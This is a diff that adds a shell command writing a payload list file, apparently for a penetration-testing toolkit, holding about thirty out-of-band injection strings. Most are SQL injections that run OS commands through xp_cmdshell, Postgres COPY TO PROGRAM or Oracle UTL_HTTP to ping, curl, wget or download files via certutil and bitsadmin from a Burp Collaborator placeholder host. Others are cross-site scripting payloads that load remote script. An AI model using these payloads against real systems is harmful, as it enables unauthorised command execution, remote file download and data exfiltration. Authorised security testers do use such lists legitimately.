@@ -1,0 +1,33 @@
+cat << 'EOF' > payloads/oob.txt
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+'><script src=//xxx.burpcollaborator.net></script>
+; DECLARE @command varchar(255); SELECT @command='ping xxx.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'
+</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/xxx.burpcollaborator.net/).slice(2),document.documentElement.appendChild(s))//'>
+%3C%22img src='https://xxx.burpcollaborator.net'%22%3E
+; exec master..xp_cmdshell 'nslookup xxx.burpcollaborator.net'--
+; exec master..xp_cmdshell 'curl http://xxx.burpcollaborator.net'--
+; exec master..xp_cmdshell 'wget http://xxx.burpcollaborator.net'--
+DECLARE @x varchar(255); SET @x='ping xxx.burpcollaborator.net'; EXEC(@x)--
+EXEC master..xp_cmdshell 'certutil -urlfetch -f http://xxx.burpcollaborator.net/test.txt'--
+EXEC master..xp_cmdshell 'powershell IWR -Uri http://xxx.burpcollaborator.net'--
+EXEC master..xp_cmdshell 'bitsadmin /transfer job /download http://xxx.burpcollaborator.net/test.txt c:\temp\test.txt'--
+' UNION SELECT LOAD_FILE('\\\\xxx.burpcollaborator.net\\test')--
+' UNION SELECT LOAD_FILE('http://xxx.burpcollaborator.net/test.txt')--
+||UTL_HTTP.REQUEST('http://xxx.burpcollaborator.net')||
+SELECT UTL_INADDR.get_host_address('xxx.burpcollaborator.net') FROM dual--
+SELECT UTL_HTTP.REQUEST('http://xxx.burpcollaborator.net/test') FROM dual--
+SELECT DBMS_LDAP.INIT('xxx.burpcollaborator.net',80) FROM dual--
+EXECUTE IMMEDIATE 'SELECT UTL_HTTP.REQUEST(''http://xxx.burpcollaborator.net'') FROM dual'--
+' || (SELECT dblink_connect('host=xxx.burpcollaborator.net port=80 user=test password=test')) || '
+'; COPY (SELECT '') TO PROGRAM 'curl http://xxx.burpcollaborator.net';--
+'; COPY (SELECT '') TO PROGRAM 'ping xxx.burpcollaborator.net';--
+<img src="http://xxx.burpcollaborator.net/test.jpg" onerror="alert(1)">
+<script>fetch('http://xxx.burpcollaborator.net')</script>
+<iframe src="http://xxx.burpcollaborator.net"></iframe>
+' OR 1=1; EXEC master..xp_fileexist '\\\\xxx.burpcollaborator.net\\test'--
+' AND 1=1; EXEC master..xp_dirtree '\\\\xxx.burpcollaborator.net\\share'--
+DECLARE @url varchar(255); SET @url='http://xxx.burpcollaborator.net'; EXEC sp_OACreate 'Microsoft.XMLHTTP', @url OUT; EXEC sp_OAMethod @url, 'open', NULL, 'GET', @url, 'False'; EXEC sp_OAMethod @url, 'send'--
+; EXEC master..xp_cmdshell 'tracert xxx.burpcollaborator.net'--
+' UNION SELECT 1, (SELECT LOAD_FILE(CONCAT('\\\\', 'xxx.burpcollaborator.net', '\\test'))), 3--
+EOF
